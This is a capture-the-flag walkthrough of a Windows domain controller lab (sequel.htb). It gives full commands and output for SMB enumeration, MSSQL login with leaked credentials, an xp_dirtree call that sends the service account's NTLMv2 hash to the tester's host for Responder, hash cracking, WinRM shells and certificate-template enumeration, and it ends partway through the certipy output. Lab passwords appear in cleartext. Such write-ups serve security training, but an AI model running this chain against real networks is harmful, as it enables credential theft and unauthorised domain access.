
Target : 10.129.228.253

Date : 26/06/2026

```bash
>  echo "10.129.228.253 escape.htb" | sudo tee -a /etc/hosts  
Please touch the FIDO authenticator.  
10.129.228.253 escape.htb  
>  nmap -sC -sV -O -Pn -p- --min-rate=3000 -T4 10.129.228.253  
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-26 07:41 +0200  
Nmap scan report for escape.htb (10.129.228.253)  
Host is up (0.038s latency).  
Not shown: 65515 filtered tcp ports (no-response)  
PORT      STATE SERVICE       VERSION  
53/tcp    open  domain        Simple DNS Plus  
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-06-26 13:42:13Z)  
135/tcp   open  msrpc         Microsoft Windows RPC  
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn  
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb, Site: Default-First-Site-Name)  
|_ssl-date: 2026-06-26T13:43:47+00:00; +8h00m00s from scanner time.  
| ssl-cert: Subject:    
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel  
| Not valid before: 2024-01-18T23:03:57  
|_Not valid after:  2074-01-05T23:03:57  
445/tcp   open  microsoft-ds?  
464/tcp   open  kpasswd5?  
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0  
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb, Site: Default-First-Site-Name)  
|_ssl-date: 2026-06-26T13:43:47+00:00; +8h00m00s from scanner time.  
| ssl-cert: Subject:    
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel  
| Not valid before: 2024-01-18T23:03:57  
|_Not valid after:  2074-01-05T23:03:57  
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM  
| ms-sql-info:    
|   10.129.228.253:1433:    
|     Version:    
|       name: Microsoft SQL Server 2019 RTM  
|       number: 15.00.2000.00  
|       Product: Microsoft SQL Server 2019  
|       Service pack level: RTM  
|       Post-SP patches applied: false  
|_    TCP port: 1433  
| ms-sql-ntlm-info:    
|   10.129.228.253:1433:    
|     Target_Name: sequel  
|     NetBIOS_Domain_Name: sequel  
|     NetBIOS_Computer_Name: DC  
|     DNS_Domain_Name: sequel.htb  
|     DNS_Computer_Name: dc.sequel.htb  
|     DNS_Tree_Name: sequel.htb  
|_    Product_Version: 10.0.17763  
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback  
| Not valid before: 2026-06-26T13:28:58  
|_Not valid after:  2056-06-26T13:28:58  
|_ssl-date: 2026-06-26T13:43:47+00:00; +8h00m00s from scanner time.  
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb, Site: Default-First-Site-Name)  
|_ssl-date: 2026-06-26T13:43:47+00:00; +8h00m00s from scanner time.  
| ssl-cert: Subject:    
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel  
| Not valid before: 2024-01-18T23:03:57  
|_Not valid after:  2074-01-05T23:03:57  
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb, Site: Default-First-Site-Name)  
| ssl-cert: Subject:    
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel  
| Not valid before: 2024-01-18T23:03:57  
|_Not valid after:  2074-01-05T23:03:57  
|_ssl-date: 2026-06-26T13:43:47+00:00; +8h00m00s from scanner time.  
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)  
|_http-server-header: Microsoft-HTTPAPI/2.0  
|_http-title: Not Found  
9389/tcp  open  mc-nmf        .NET Message Framing  
49667/tcp open  msrpc         Microsoft Windows RPC  
49689/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0  
49690/tcp open  msrpc         Microsoft Windows RPC  
49702/tcp open  msrpc         Microsoft Windows RPC  
49712/tcp open  msrpc         Microsoft Windows RPC  
49736/tcp open  msrpc         Microsoft Windows RPC  
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port  
Device type: general purpose  
Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)  
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10  
Aggressive OS guesses: Microsoft Windows Server 2019 (97%), Microsoft Windows 10 1903 - 22H2 (91%)  
No exact OS matches for host (test conditions non-ideal).  
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows  
  
Host script results:  
| smb2-time:    
|   date: 2026-06-26T13:43:07  
|_  start_date: N/A  
|_clock-skew: mean: 7h59m59s, deviation: 0s, median: 7h59m59s  
| smb2-security-mode:    
|   3.1.1:    
|_    Message signing enabled and required  
  
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
Nmap done: 1 IP address (1 host up) scanned in 144.81 seconds
```

We got `sequel.htb` and `dc.sequel.htb` as domain names. `DNS 53/tcp` port is open, as well as the usual Active Directory ports : `LDAP 389/tcp, kerberos 88/tcp, SMB 445/tcp, msrpc 135/tcp, netBIOS 139/tcp` and `ms-sql 1433/tcp`.

We'll add the domain names to `/etc/hosts` and `nxc smb shares` :

```bash
>  sudo nano /etc/hosts
>  nxc smb 10.129.228.253 -u guest -p '' --shares  
SMB         10.129.228.253  445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:None) (Null Auth:True)  
SMB         10.129.228.253  445    DC               [+] sequel.htb\guest:    
SMB         10.129.228.253  445    DC               [*] Enumerated shares  
SMB         10.129.228.253  445    DC               Share           Permissions     Remark  
SMB         10.129.228.253  445    DC               -----           -----------     ------  
SMB         10.129.228.253  445    DC               ADMIN$                          Remote Admin  
SMB         10.129.228.253  445    DC               C$                              Default share  
SMB         10.129.228.253  445    DC               IPC$            READ            Remote IPC  
SMB         10.129.228.253  445    DC               NETLOGON                        Logon server share    
SMB         10.129.228.253  445    DC               Public          READ               
SMB         10.129.228.253  445    DC               SYSVOL                          Logon server share
>  smbclient //10.129.228.253/Public -U guest%  
Try "help" to get a list of possible commands.  
smb: \> ls  
 .                                   D        0  Sat Nov 19 12:51:25 2022  
 ..                                  D        0  Sat Nov 19 12:51:25 2022  
 SQL Server Procedures.pdf           A    49551  Fri Nov 18 14:39:43 2022  
  
               5184255 blocks of size 4096. 1466905 blocks available  
smb: \> get "SQL Server Procedures.pdf"  
getting file \SQL Server Procedures.pdf of size 49551 as SQL Server Procedures.pdf (159.2 KiloBytes/sec) (average 159.2 KiloBytes/sec)  
smb: \> quit  
```

We convert to a readable text with `pdftotext` and `cat` :

```
>  cat 'SQL Server Procedures.txt'  
SQL Server Procedures  
Since last year we've got quite few accidents with our SQL Servers (looking at you Ryan, with your instance on the DC, why should  
you even put a mock instance on the DC?!). So Tom decided it was a good idea to write a basic procedure on how to access and  
then test any changes to the database. Of course none of this will be done on the live server, we cloned the DC mockup to a  
dedicated server.  
Tom will remove the instance from the DC as soon as he comes back from his vacation.  
The second reason behind this document is to work like a guide when no senior can be available for all juniors.  
  
Accessing from Domain Joined machine  
1. Use SQL Management Studio specifying "Windows" authentication which you can donwload here:  
https://learn.microsoft.com/en-us/sql/ssms/download-sql-server-management-studio-ssms?view=sql-server-ver16  
2. In the "Server Name" field, input the server name.  
3. Specify "Windows Authentication" and you should be good to go.  
4. Access the database and make that you need. Everything will be resynced with the Live server overnight.  
  
Accessing from non domain joined machine  
Accessing from non domain joined machines can be a little harder.  
The procedure is the same as the domain joined machine but you need to spawn a command prompt and run the following  
command: cmdkey /add:"<serverName>.sequel.htb" /user:"sequel\<userame>" /pass:<password> . Follow the other steps from  
above procedure.  
If any problem arises, please send a mail to Brandon  
  
  
Bonus  
For new hired and those that are still waiting their users to be created and perms assigned, can sneak a peek at the Database with  
user PublicUser and password GuestUserCantWrite1 .  
Refer to the previous guidelines and make sure to switch the "Windows Authentication" to "SQL Server Authentication".
```

We got `PublicUser:GuestUserCantWrite1` for the `SQL` database.

```bash
>  mssqlclient.py 'PublicUser:GuestUserCantWrite1@sequel.htb' -port 1433  
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies    
  
[*] Encryption required, switching to TLS  
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master  
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english  
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192  
[*] INFO(DC\SQLMOCK): Line 1: Changed database context to 'master'.  
[*] INFO(DC\SQLMOCK): Line 1: Changed language setting to us_english.  
[*] ACK: Result: 1 - Microsoft SQL Server 2019 RTM (15.0.2000)  
[!] Press help for extra shell commands  
SQL (PublicUser  guest@master)> SELECT SYSTEM_USER  
               
----------      
PublicUser
SQL (PublicUser  guest@master)> SELECT IS_SRVROLEMEMBER('sysadmin');  
      
-      
0      
SQL (PublicUser  guest@master)> SELECT name FROM sys.databases;  
name        
------      
master      
tempdb      
model       
msdb
```

Then, after opening a `responder` on our VPN `tun IP` :

```bash
> sudo responder -I tun0 -v
```

```bash
SQL (PublicUser  guest@master)> EXEC master.sys.xp_dirtree '\\10.10.14.129\test', 1, 1;
```

And the responder gave us :

```bash
[SMB] NTLMv2-SSP Client   : 10.129.228.253  
[SMB] NTLMv2-SSP Username : sequel\sql_svc  
[SMB] NTLMv2-SSP Hash     : REDACTED
```

We got a `sql_svc` `NTLMv2` hash.

We put the full hash in a `txt` file and use `john` to crack it :

```bash
>  nano escape.txt  
>  john --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt escape.txt  
  
Warning: detected hash type "netntlmv2", but the string is also recognized as "ntlmv2-opencl"  
Use the "--format=ntlmv2-opencl" option to force loading these as that type instead  
Using default input encoding: UTF-8  
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])  
Will run 8 OpenMP threads  
Press 'q' or Ctrl-C to abort, almost any other key for status  
REGGIE1234ronnie (sql_svc)  
1g 0:00:00:06 DONE (2026-06-26 08:23) 0.1526g/s 1634Kp/s 1634Kc/s 1634KC/s RENZOH..RBDSEX  
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably  
Session completed
```

We got `REGGIE1234ronnie`.

```PowerShell
>  nxc winrm 10.129.228.253 -u sql_svc -p REGGIE1234ronnie  
WINRM       10.129.228.253  5985   DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:sequel.htb)    
WINRM       10.129.228.253  5985   DC               [+] sequel.htb\sql_svc:REGGIE1234ronnie (Pwn3d!)  
>  evil-winrm -i 10.129.228.253 -u sql_svc -p REGGIE1234ronnie  
  
/usr/share/evil-winrm/vendor/bundle/ruby/3.4.0/gems/winrm-2.3.9/lib/winrm/psrp/fragment.rb:35: warning: redefining 'object_id' may cause serious problems  
/usr/share/evil-winrm/vendor/bundle/ruby/3.4.0/gems/winrm-2.3.9/lib/winrm/psrp/message_fragmenter.rb:29: warning: redefining 'object_id' may cause serious problems  
/usr/lib/ruby/3.4.0/readline.rb:4: warning: reline was loaded from the standard library, but will no longer be part of the default gems starting from Ruby 4.0.0.  
You can add reline to your Gemfile or gemspec to silence this warning.  
                                          
Evil-WinRM shell v3.9  
                                          
Warning: Remote path completions is disabled due to ruby limitation: undefined method 'quoting_detection_proc' for module Reline  
                                          
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion  
                                          
Info: Establishing connection to remote endpoint  
/usr/share/evil-winrm/vendor/bundle/ruby/3.4.0/gems/rexml-3.4.4/lib/rexml/xpath.rb:67: warning: REXML::XPath.each, REXML::XPath.first, REXML::XPath.match dropped support for nodeset...  
*Evil-WinRM* PS C:\Users\sql_svc\Documents> dir C:\Users  
  
  
   Directory: C:\Users  
  
  
Mode                LastWriteTime         Length Name  
----                -------------         ------ ----  
d-----         2/7/2023   8:58 AM                Administrator  
d-r---        7/20/2021  12:23 PM                Public  
d-----         2/1/2023   6:37 PM                Ryan.Cooper  
d-----         2/7/2023   8:10 AM                sql_svc
```

And a shell. We can see `Ryan.Cooper` is inside, the `user flag` must be on his desktop.

We look for error logs :

```PowerShell
*Evil-WinRM* PS C:\Users\sql_svc\Documents> dir C:\sqlserver\Logs\
 


    Directory: C:\sqlserver\Logs


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         2/7/2023   8:06 AM          27608 ERRORLOG.BAK


*Evil-WinRM* PS C:\Users\sql_svc\Documents> type C:\sqlserver\Logs\ERRORLOG.bak
 
2022-11-18 13:43:05.96 Server      Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64)
        Sep 24 2019 13:48:23
        Copyright (C) 2019 Microsoft Corporation
        Express Edition (64-bit) on Windows Server 2019 Standard Evaluation 10.0 <X64> (Build 17763: ) (Hypervisor)

2022-11-18 13:43:05.97 Server      UTC adjustment: -8:00
2022-11-18 13:43:05.97 Server      (c) Microsoft Corporation.
2022-11-18 13:43:05.97 Server      All rights reserved.
2022-11-18 13:43:05.97 Server      Server process ID is 3788.
2022-11-18 13:43:05.97 Server      System Manufacturer: 'VMware, Inc.', System Model: 'VMware7,1'.
2022-11-18 13:43:05.97 Server      Authentication mode is MIXED.
2022-11-18 13:43:05.97 Server      Logging SQL Server messages in file 'C:\Program Files\Microsoft SQL Server\MSSQL15.SQLMOCK\MSSQL\Log\ERRORLOG'.
2022-11-18 13:43:05.97 Server      The service account is 'NT Service\MSSQL$SQLMOCK'. This is an informational message; no user action is required.
2022-11-18 13:43:05.97 Server      Registry startup parameters:
         -d C:\Program Files\Microsoft SQL Server\MSSQL15.SQLMOCK\MSSQL\DATA\master.mdf
         -e C:\Program Files\Microsoft SQL Server\MSSQL15.SQLMOCK\MSSQL\Log\ERRORLOG
         -l C:\Program Files\Microsoft SQL Server\MSSQL15.SQLMOCK\MSSQL\DATA\mastlog.ldf
2022-11-18 13:43:05.97 Server      Command Line Startup Parameters:
         -s "SQLMOCK"
         -m "SqlSetup"
         -Q
         -q "SQL_Latin1_General_CP1_CI_AS"
         -T 4022
         -T 4010
         -T 3659
         -T 3610
         -T 8015
2022-11-18 13:43:05.97 Server      SQL Server detected 1 sockets with 1 cores per socket and 1 logical processors per socket, 1 total logical processors; using 1 logical processors based on SQL Server licensing. This is an informational message; no user action is required.
2022-11-18 13:43:05.97 Server      SQL Server is starting at normal priority base (=7). This is an informational message only. No user action is required.
2022-11-18 13:43:05.97 Server      Detected 2046 MB of RAM. This is an informational message; no user action is required.
2022-11-18 13:43:05.97 Server      Using conventional memory in the memory manager.
2022-11-18 13:43:05.97 Server      Page exclusion bitmap is enabled.
2022-11-18 13:43:05.98 Server      Buffer Pool: Allocating 262144 bytes for 166158 hashPages.
2022-11-18 13:43:06.01 Server      Default collation: SQL_Latin1_General_CP1_CI_AS (us_english 1033)
2022-11-18 13:43:06.04 Server      Buffer pool extension is already disabled. No action is necessary.
2022-11-18 13:43:06.06 Server      Perfmon counters for resource governor pools and groups failed to initialize and are disabled.
2022-11-18 13:43:06.07 Server      Query Store settings initialized with enabled = 1,
2022-11-18 13:43:06.07 Server      This instance of SQL Server last reported using a process ID of 5116 at 11/18/2022 1:43:04 PM (local) 11/18/2022 9:43:04 PM (UTC). This is an informational message only; no user action is required.
2022-11-18 13:43:06.07 Server      Node configuration: node 0: CPU mask: 0x0000000000000001:0 Active CPU mask: 0x0000000000000001:0. This message provides a description of the NUMA configuration for this computer. This is an informational message only. No user action is required.
2022-11-18 13:43:06.07 Server      Using dynamic lock allocation.  Initial allocation of 2500 Lock blocks and 5000 Lock Owner blocks per node.  This is an informational message only.  No user action is required.
2022-11-18 13:43:06.08 Server      In-Memory OLTP initialized on lowend machine.
2022-11-18 13:43:06.08 Server      The maximum number of dedicated administrator connections for this instance is '1'
2022-11-18 13:43:06.09 Server      [INFO] Created Extended Events session 'hkenginexesession'

2022-11-18 13:43:06.09 Server      Database Instant File Initialization: disabled. For security and performance considerations see the topic 'Database Instant File Initialization' in SQL Server Books Online. This is an informational message only. No user action is required.
2022-11-18 13:43:06.10 Server      CLR version v4.0.30319 loaded.
2022-11-18 13:43:06.10 Server      Total Log Writer threads: 1. This is an informational message; no user action is required.
2022-11-18 13:43:06.13 Server      Database Mirroring Transport is disabled in the endpoint configuration.
2022-11-18 13:43:06.13 Server      clflushopt is selected for pmem flush operation.
2022-11-18 13:43:06.14 Server      Software Usage Metrics is disabled.
2022-11-18 13:43:06.14 spid9s      Warning ******************
2022-11-18 13:43:06.36 spid9s      SQL Server started in single-user mode. This an informational message only. No user action is required.
2022-11-18 13:43:06.36 Server      Common language runtime (CLR) functionality initialized using CLR version v4.0.30319 from C:\Windows\Microsoft.NET\Framework64\v4.0.30319\.
2022-11-18 13:43:06.37 spid9s      Starting up database 'master'.
2022-11-18 13:43:06.38 spid9s      The tail of the log for database master is being rewritten to match the new sector size of 4096 bytes.  2048 bytes at offset 419840 in file C:\Program Files\Microsoft SQL Server\MSSQL15.SQLMOCK\MSSQL\DATA\mastlog.ldf will be written.
2022-11-18 13:43:06.39 spid9s      Converting database 'master' from version 897 to the current version 904.
2022-11-18 13:43:06.39 spid9s      Database 'master' running the upgrade step from version 897 to version 898.
2022-11-18 13:43:06.40 spid9s      Database 'master' running the upgrade step from version 898 to version 899.
2022-11-18 13:43:06.41 spid9s      Database 'master' running the upgrade step from version 899 to version 900.
2022-11-18 13:43:06.41 spid9s      Database 'master' running the upgrade step from version 900 to version 901.
2022-11-18 13:43:06.41 spid9s      Database 'master' running the upgrade step from version 901 to version 902.
2022-11-18 13:43:06.52 spid9s      Database 'master' running the upgrade step from version 902 to version 903.
2022-11-18 13:43:06.52 spid9s      Database 'master' running the upgrade step from version 903 to version 904.
2022-11-18 13:43:06.72 spid9s      SQL Server Audit is starting the audits. This is an informational message. No user action is required.
2022-11-18 13:43:06.72 spid9s      SQL Server Audit has started the audits. This is an informational message. No user action is required.
2022-11-18 13:43:06.74 spid9s      SQL Trace ID 1 was started by login "sa".
2022-11-18 13:43:06.74 spid9s      Server name is 'DC\SQLMOCK'. This is an informational message only. No user action is required.
2022-11-18 13:43:06.75 spid14s     Starting up database 'mssqlsystemresource'.
2022-11-18 13:43:06.75 spid9s      Starting up database 'msdb'.
2022-11-18 13:43:06.75 spid18s     Password policy update was successful.
2022-11-18 13:43:06.76 spid14s     The resource database build version is 15.00.2000. This is an informational message only. No user action is required.
2022-11-18 13:43:06.78 spid9s      The tail of the log for database msdb is being rewritten to match the new sector size of 4096 bytes.  3072 bytes at offset 50176 in file C:\Program Files\Microsoft SQL Server\MSSQL15.SQLMOCK\MSSQL\DATA\MSDBLog.ldf will be written.
2022-11-18 13:43:06.78 spid9s      Converting database 'msdb' from version 897 to the current version 904.
2022-11-18 13:43:06.78 spid9s      Database 'msdb' running the upgrade step from version 897 to version 898.
2022-11-18 13:43:06.79 spid14s     Starting up database 'model'.
2022-11-18 13:43:06.79 spid9s      Database 'msdb' running the upgrade step from version 898 to version 899.
2022-11-18 13:43:06.80 spid14s     The tail of the log for database model is being rewritten to match the new sector size of 4096 bytes.  512 bytes at offset 73216 in file C:\Program Files\Microsoft SQL Server\MSSQL15.SQLMOCK\MSSQL\DATA\modellog.ldf will be written.
2022-11-18 13:43:06.80 spid9s      Database 'msdb' running the upgrade step from version 899 to version 900.
2022-11-18 13:43:06.81 spid14s     Converting database 'model' from version 897 to the current version 904.
2022-11-18 13:43:06.81 spid14s     Database 'model' running the upgrade step from version 897 to version 898.
2022-11-18 13:43:06.81 spid9s      Database 'msdb' running the upgrade step from version 900 to version 901.
2022-11-18 13:43:06.81 spid14s     Database 'model' running the upgrade step from version 898 to version 899.
2022-11-18 13:43:06.81 spid9s      Database 'msdb' running the upgrade step from version 901 to version 902.
2022-11-18 13:43:06.82 spid14s     Database 'model' running the upgrade step from version 899 to version 900.
2022-11-18 13:43:06.88 spid18s     A self-generated certificate was successfully loaded for encryption.
2022-11-18 13:43:06.88 spid18s     Server local connection provider is ready to accept connection on [ \\.\pipe\SQLLocal\SQLMOCK ].
2022-11-18 13:43:06.88 spid18s     Dedicated administrator connection support was not started because it is disabled on this edition of SQL Server. If you want to use a dedicated administrator connection, restart SQL Server using the trace flag 7806. This is an informational message only. No user action is required.
2022-11-18 13:43:06.88 spid18s     SQL Server is now ready for client connections. This is an informational message; no user action is required.
2022-11-18 13:43:06.88 Server      SQL Server is attempting to register a Service Principal Name (SPN) for the SQL Server service. Kerberos authentication will not be possible until a SPN is registered for the SQL Server service. This is an informational message. No user action is required.
2022-11-18 13:43:06.88 spid14s     Database 'model' running the upgrade step from version 900 to version 901.
2022-11-18 13:43:06.89 Server      The SQL Server Network Interface library could not register the Service Principal Name (SPN) [ MSSQLSvc/dc.sequel.htb:SQLMOCK ] for the SQL Server service. Windows return code: 0x2098, state: 15. Failure to register a SPN might cause integrated authentication to use NTLM instead of Kerberos. This is an informational message. Further action is only required if Kerberos authentication is required by authentication policies and if the SPN has not been manually registered.
2022-11-18 13:43:06.89 spid14s     Database 'model' running the upgrade step from version 901 to version 902.
2022-11-18 13:43:06.89 spid14s     Database 'model' running the upgrade step from version 902 to version 903.
2022-11-18 13:43:06.89 spid14s     Database 'model' running the upgrade step from version 903 to version 904.
2022-11-18 13:43:07.00 spid14s     Clearing tempdb database.
2022-11-18 13:43:07.06 spid14s     Starting up database 'tempdb'.
2022-11-18 13:43:07.17 spid9s      Database 'msdb' running the upgrade step from version 902 to version 903.
2022-11-18 13:43:07.17 spid9s      Database 'msdb' running the upgrade step from version 903 to version 904.
2022-11-18 13:43:07.29 spid9s      Recovery is complete. This is an informational message only. No user action is required.
2022-11-18 13:43:07.30 spid51      Changed database context to 'master'.
2022-11-18 13:43:07.30 spid51      Changed language setting to us_english.
2022-11-18 13:43:07.33 spid51      Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
2022-11-18 13:43:07.34 spid51      Configuration option 'default language' changed from 0 to 0. Run the RECONFIGURE statement to install.
2022-11-18 13:43:07.34 spid51      Configuration option 'default full-text language' changed from 1033 to 1033. Run the RECONFIGURE statement to install.
2022-11-18 13:43:07.34 spid51      Configuration option 'show advanced options' changed from 1 to 0. Run the RECONFIGURE statement to install.
2022-11-18 13:43:07.39 spid51      Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
2022-11-18 13:43:07.39 spid51      Configuration option 'user instances enabled' changed from 1 to 1. Run the RECONFIGURE statement to install.
2022-11-18 13:43:07.39 spid51      Configuration option 'show advanced options' changed from 1 to 0. Run the RECONFIGURE statement to install.
2022-11-18 13:43:07.44 spid51      Changed database context to 'master'.
2022-11-18 13:43:07.44 spid51      Changed language setting to us_english.
2022-11-18 13:43:07.44 Logon       Error: 18456, Severity: 14, State: 8.
2022-11-18 13:43:07.44 Logon       Logon failed for user 'sequel.htb\Ryan.Cooper'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
2022-11-18 13:43:07.48 Logon       Error: 18456, Severity: 14, State: 8.
2022-11-18 13:43:07.48 Logon       Logon failed for user 'NuclearMosquito3'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
2022-11-18 13:43:07.72 spid51      Attempting to load library 'xpstar.dll' into memory. This is an informational message only. No user action is required.
2022-11-18 13:43:07.76 spid51      Using 'xpstar.dll' version '2019.150.2000' to execute extended stored procedure 'xp_sqlagent_is_starting'. This is an informational message only; no user action is required.
2022-11-18 13:43:08.24 spid51      Changed database context to 'master'.
2022-11-18 13:43:08.24 spid51      Changed language setting to us_english.
2022-11-18 13:43:09.29 spid9s      SQL Server is terminating in response to a 'stop' request from Service Control Manager. This is an informational message only. No user action is required.
2022-11-18 13:43:09.31 spid9s      .NET Framework runtime has been stopped.
2022-11-18 13:43:09.43 spid9s      SQL Trace was stopped due to server shutdown. Trace ID = '1'. This is an informational message only; no user action is required.
```

We find "2022-11-18 13:43:07.44 Logon       Logon failed for user 'sequel.htb\Ryan.Cooper'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
2022-11-18 13:43:07.48 Logon       Error: 18456, Severity: 14, State: 8.
2022-11-18 13:43:07.48 Logon       Logon failed for user 'NuclearMosquito3'."

We try the combination :

```bash
>  nxc winrm 10.129.228.253 -u ryan.cooper -p NuclearMosquito3  
WINRM       10.129.228.253  5985   DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:sequel.htb)    
WINRM       10.129.228.253  5985   DC               [+] sequel.htb\ryan.cooper:NuclearMosquito3 (Pwn3d!)
```

And Ryan (as indicated in the pdf) commited the mistake of putting his password in the login field.

```PowerShell
>  evil-winrm -i sequel.htb -u ryan.cooper -p 'NuclearMosquito3'  
  
/usr/share/evil-winrm/vendor/bundle/ruby/3.4.0/gems/winrm-2.3.9/lib/winrm/psrp/fragment.rb:35: warning: redefining 'object_id' may cause serious problems  
/usr/share/evil-winrm/vendor/bundle/ruby/3.4.0/gems/winrm-2.3.9/lib/winrm/psrp/message_fragmenter.rb:29: warning: redefining 'object_id' may cause serious problems  
/usr/lib/ruby/3.4.0/readline.rb:4: warning: reline was loaded from the standard library, but will no longer be part of the default gems starting from Ruby 4.0.0.  
You can add reline to your Gemfile or gemspec to silence this warning.  
                                          
Evil-WinRM shell v3.9  
                                          
Warning: Remote path completions is disabled due to ruby limitation: undefined method 'quoting_detection_proc' for module Reline  
                                          
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion  
                                          
Info: Establishing connection to remote endpoint  
/usr/share/evil-winrm/vendor/bundle/ruby/3.4.0/gems/rexml-3.4.4/lib/rexml/xpath.rb:67: warning: REXML::XPath.each, REXML::XPath.first, REXML::XPath.match dropped support for nodeset...  
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents> type C:\Users\Ryan.Cooper\Desktop\user.txt  
REDACTED
```

We got the user flag. We'll `ntupdate` our time and `skew` it for `kerberos tickets` to be accepted :

```bash
>  sudo timedatectl set-ntp false  
  
Please touch the FIDO authenticator.  
>  sudo ntpdate -u 10.129.228.253  
  
26 Jun 16:43:04 ntpdate[41054]: step time server 10.129.228.253 offset +28800.316837 sec  
>  date -u  
  
Fri Jun 26 02:43:06 PM UTC 2026  
```

```bash
>  certipy find -u 'ryan.cooper@sequel.htb' -p 'NuclearMosquito3' -dc-ip 10.129.228.253 -vulnerable -stdout  
  
Certipy v5.0.4 - by Oliver Lyak (ly4k)  
  
[*] Finding certificate templates  
[*] Found 34 certificate templates  
[*] Finding certificate authorities  
[*] Found 1 certificate authority  
[*] Found 12 enabled certificate templates  
[*] Finding issuance policies  
[*] Found 15 issuance policies  
[*] Found 0 OIDs linked to templates  
[*] Retrieving CA configuration for 'sequel-DC-CA' via RRP  
[!] Failed to connect to remote registry. Service should be starting now. Trying again...  
[*] Successfully retrieved CA configuration for 'sequel-DC-CA'  
[*] Checking web enrollment for CA 'sequel-DC-CA' @ 'dc.sequel.htb'  
[!] Error checking web enrollment: timed out  
[!] Use -debug to print a stacktrace  
[!] Error checking web enrollment: timed out  
[!] Use -debug to print a stacktrace  
[*] Enumeration output:  
Certificate Authorities  
 0  
   CA Name                             : sequel-DC-CA  
   DNS Name                            : dc.sequel.htb  
   Certificate Subject                 : CN=sequel-DC-CA, DC=sequel, DC=htb  
   Certificate Serial Number           : 1EF2FA9A7E6EADAD4F5382F4CE283101  
   Certificate Validity Start          : 2022-11-18 20:58:46+00:00  
   Certificate Validity End            : 2121-11-18 21:08:46+00:00  
   Web Enrollment  
     HTTP  
       Enabled                         : False  
     HTTPS  
       Enabled                         : False  
   User Specified SAN                  : Disabled  
   Request Disposition                 : Issue  
   Enforce Encryption for Requests     : Enabled  
   Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy  
   Permissions  
     Owner                             : SEQUEL.HTB\Administrators  
     Access Rights  
       ManageCa                        : SEQUEL.HTB\Administrators  
                                         SEQUEL.HTB\Domain Admins  
                                         SEQUEL.HTB\Enterprise Admins  
       ManageCertificates              : SEQUEL.HTB\Administrators  
                                         SEQUEL.HTB\Domain Admins  
                                         SEQUEL.HTB\Enterprise Admins  
       Enroll                          : SEQUEL.HTB\Authenticated Users  
Certificate Templates  
 0  
   Template Name                       : UserAuthentication  
   Display Name                        : UserAuthentication  
   Certificate Authorities             : sequel-DC-CA  
   Enabled                             : True  
   Client Authentication               : True  
   Enrollment Agent                    : False  
   Any Purpose                         : False  
   Enrollee Supplies Subject           : True  
   Certificate Name Flag               : EnrolleeSuppliesSubject  
   Enrollment Flag                     : IncludeSymmetricAlgorithms  
                                         PublishToDs  
   Private Key Flag                    : ExportableKey  
   Extended Key Usage                  : Client Authentication  
                                         Secure Email  
                                         Encrypting File System  
   Requires Manager Approval           : False  
   Requires Key Archival               : False  
   Authorized Signatures Required      : 0  
   Schema Version                      : 2  
   Validity Period                     : 10 years  
   Renewal Period                      : 6 weeks  
   Minimum RSA Key Length              : 2048  
   Template Created                    : 2022-11-18T21:10:22+00:00  
   Template Last Modified              : 2024-01-19T00:26:38+00:00  
   Permissions  
     Enrollment Permissions  
       Enrollment Rights               : SEQUEL.HTB\Domain Admins  
                                         SEQUEL.HTB\Domain Users  
                                         SEQUEL.HTB\Enterprise Admins  
     Object Control Permissions  
       Owner                           : SEQUEL.HTB\Administrator  
       Full Control Principals         : SEQUEL.HTB\Domain Admins  
                                         SEQUEL.HTB\Enterprise Admins  
       Write Owner Principals          : SEQUEL.HTB\Domain Admins  
                                         SEQUEL.HTB\Enterprise Admins  
       Write Dacl Principals           : SEQUEL.HTB\Domain Admins  
                                         SEQUEL.HTB\Enterprise Admins  
       Write Property Enroll           : SEQUEL.HTB\Domain Admins  
                                         SEQUEL.HTB\Domain Users  
                                         SEQUEL.HTB\Enterprise Admins  
